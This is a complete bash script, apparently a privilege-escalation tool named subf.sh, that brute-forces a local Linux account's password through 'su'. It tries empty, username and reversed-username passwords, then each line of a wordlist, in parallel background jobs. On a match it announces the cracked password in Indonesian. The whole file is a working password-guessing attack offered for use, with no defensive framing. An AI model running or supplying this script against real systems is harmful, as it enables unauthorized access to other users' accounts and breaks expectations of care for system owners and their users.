#!/bin/bash

Example: ./subf.sh -u <USERNAME> [-w top12000.txt] [-t 0.9] [-s 0.007]

WORDLIST="top12000.txt"
USER=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
while getopts "h?u:t:s:w:" opt; do
  case "$opt" in
    h|\?) printf "$help"; exit 0;;
    u)  USER=$OPTARG;;
    t)  TIMEOUTPROC=$OPTARG;;
    s)  SLEEPPROC=$OPTARG;;
    w)  WORDLIST=$OPTARG;;
    esac
done

if ! [ "$USER" ]; then printf "$help"; exit 0; fi

if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi

C=$(printf '\033')

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "Berhasil Silahkan Login $USER Menggunakan Password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

su_brute_user_num (){
  echo "  [+] Bruteforcing $1..."
  USER=$1
  su_try_pwd $USER "" &    #Try without password
  su_try_pwd $USER $USER & #Try username as password
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password

  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
    while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file   
      su_try_pwd $USER $P & #Try TOP TRIES of passwords (by default 2000)
      sleep $SLEEPPROC # To not overload the system
    done < $WORDLIST

  else
    cat - | while read line; do
      su_try_pwd $USER $line & #Try TOP TRIES of passwords (by default 2000)    
      sleep $SLEEPPROC # To not overload the system
    done
  fi
  wait
}

su_brute_user_num $USER
echo "gagal coeg" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
